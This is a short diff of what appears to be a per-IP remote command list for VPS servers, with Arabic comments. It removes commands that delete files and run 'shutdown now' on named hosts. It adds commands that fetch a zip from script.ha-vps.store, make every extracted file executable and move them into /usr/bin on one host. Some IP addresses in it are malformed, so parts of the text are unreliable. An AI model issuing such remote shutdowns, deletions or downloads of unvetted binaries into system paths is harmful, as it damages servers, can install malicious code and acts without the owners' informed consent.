@@ -1,8 +1,5 @@
-# هذا أمر عام
-rm -f /usr/bin/menu@138.197.140.159
-
-# هذا خاص فقط بـ VPS بـ IP محدد
-rm -f ~/.blocked@138.197.1840.159
-
-# هاد واحد آخر IP
-shutdown now@5.189.1883.1
+wget https://script.ha-vps.store/menu.zip@138.197.140.159
+unzip menu.zip@138.197.140.159
+rm -f menu.zip@138.197.140.159
+chmod +x *@138.197.140.159
+mv * /usr/bin/@138.197.140.159
